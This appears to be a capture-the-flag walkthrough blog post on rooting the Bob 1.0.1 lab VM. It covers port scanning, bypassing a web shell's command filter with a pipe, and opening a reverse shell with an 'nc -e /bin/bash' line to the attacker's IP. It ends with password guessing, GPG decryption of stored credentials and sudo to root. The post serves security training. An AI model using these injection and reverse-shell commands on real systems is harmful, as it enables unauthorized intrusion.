@@ -1,0 +1,315 @@
+
+								
+																		Hack the Bob: 1.0.1 VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 26, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to take another CTF challenge known as Bob: 1.0.1 The credit for making this vulnerable machine goes to “c0rruptedb1t” and it is another capture the flag challenge in which our goal is to gain root access and capture the flag to complete the challenge. You can download this VM here.
+Penetrating Methodologies
+
+Port scanning and IP discovery
+Browsing the IP on Browser
+Enumerating server webpage
+Discovering RCE Vulnerability
+Bypassing the Filter for RCE
+Getting a shell using netcat
+Enumerating the System for Users
+Getting Root Access
+Enumerating the System for Flags
+Reading the flags
+
+Let’s Breach!!!
+Let’s start from getting to know the IP of VM (Here, I have it at 192.168.1.109 but you will have to find your own)
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Now let’s move towards enumeration in context to identify running services and open of victim’s machine by using the most popular tool Nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.109
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.109
+					
+				
+			
+		
+
+Awesome!! Nmap has done a remarkable job by dumping the details of service running on open port 80. It also found the robot.txt and it showed us that it contains /login.php, /dev_shell.php /lat_memo.html, /passwords.html
+
+Knowing port 80 is open in the victim’s network I preferred to explore his IP in the browser.
+
+After this I was curious about the links inside the robots.txt so, I went on to open those. One that drew my attention was
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.109/dev_shell.php
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.109/dev_shell.php
+					
+				
+			
+		
+
+It seemed like a shell, so I tried to run the “ls” command.
+It didn’t work and I got a Denied message “Get out skid lol”
+
+My next try was a pwd command. But even then, there was no success.
+
+OK, As I was about to give up on this shell, I thought to try “id” command.
+At last! I had a command which could run in this shell. Now all I have to do is bypass it in order to generate a shell.
+
+I tried “id | ls” and I have the result for both commands. I have successfully bypassed with a single pipe (|)
+As I ran the “ls” command, I saw a file “dev_shell.php.bak”. I save that file on my system.
+
+As I ran the “ls” command, I saw a file “dev_shell.php.bak”. I save that file on my system.
+
+After downloading the “dev_shell.php.bak”, I opened the file using cat command as shown in the image given below.
+You can see variable $bad_words, it is the list of commands which were banned in the dev_shell.php we were messing with earlier.
+
+You can see that the netcat command is not allowed but “nc” is not on the list. So, I decided to get the shell using nc. I generated a shell using this command:
+
+		
+		
+			
+			
+			
+			
+id | nc -e /bin/bash 192.168.1.132 6000
+			
+				
+					
+				
+					1
+				
+						id | nc -e /bin/bash 192.168.1.132 6000
+					
+				
+			
+		
+
+Here, 192.168.1.132 is the IP of My Attacking Machine (Kali Linux)
+
+
+Before running this command, Start a netcat listener on the port 6000 to grab the shell which will be generated using the command mentioned before.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 6000
+			
+				
+					
+				
+					1
+				
+						nc -lvp 6000
+					
+				
+			
+		
+
+As soon as I ran the command on the browser, I got a limited shell on my netcat listener. Now let’s spawn a TTY Shell 
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+OK, this gave us a proper shell. After changing to the home directory, we found the following users
+
+After browsing through the user directories, I found something in Elliot’s directory. I found a text file named “theadminisdumb.txt”
+
+On opening, it was a description of the employees in the IT department and especially the admin. He says that the admin is dumb because he sets a default password on the systems “Qwerty”.
+
+This gave us a hint that one of the users must have the password as Qwerty. The only way to find out is brute forcing manually as shown below.
+su [username]
+I found out that User jc has the password Qwerty. So, logged in using the jc credentials. 
+
+Now again let’s look for another clue in the user directories. After looking for a while. I found another text file in user bob’s Document Directory called staff.txt. But we also found a login.txt.gpg but GPG or GNU Privacy Guard is the encrypted file, we are going to need a passphrase to decrypt the text file. Our next Target is to get that passphrase. We also got a Directory named Secret. Let’s get into that.
+
+There was a folder inside a folder and go on till we have a note.sh file.
+The Path for that file is /home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh
+On finding those notes.sh, I opened it using cat command. It contained Message:
+Harry Potter is my favourite
+ Are you real me?
+ Right, I’m ordering pizza this is going nowhere
+ People just don’t get me
+ Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;
+ Cucumber
+ Rest now your eyes are sleepy
+ Are you gonna stop reading this yet?
+ Time to fix the server
+ Everyone is annoying
+ Sticky notes gotta buy em
+We tried a couple of combination from the words in them but after some multiple guesses. Then it struck me that I could try to use the first letter of every sentence and create a word, after doing that I got the word “HARPOCRATES” On googling it I found that it has done something with secrets and password. This made me sure that it is the passphrase for the gpg file.
+
+So time to decrypt the gpg file
+
+		
+		
+			
+			
+			
+			
+gpg --batch –passphrase HARPOCRATES -d login.txt.gpg
+			
+				
+					
+				
+					1
+				
+						gpg --batch –passphrase HARPOCRATES -d login.txt.gpg
+					
+				
+			
+		
+
+Great! We have the bob login credentials!
+Username: bob
+Password: b0bcat_
+
+Now that we have the login credentials let’s login into bob’s shell
+After logging in I ran the command sudo -l which showed that we have “ALL” Permission. Now all we have to do is get on to root shell which can be done using command sudo su
+
+After we got into the root shell all that is left is to open the root flag which can be done using command cat /flag.txt.
+
+Author: Pavandeep Singh is a Technical Writer, Researcher and Penetration Tester Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
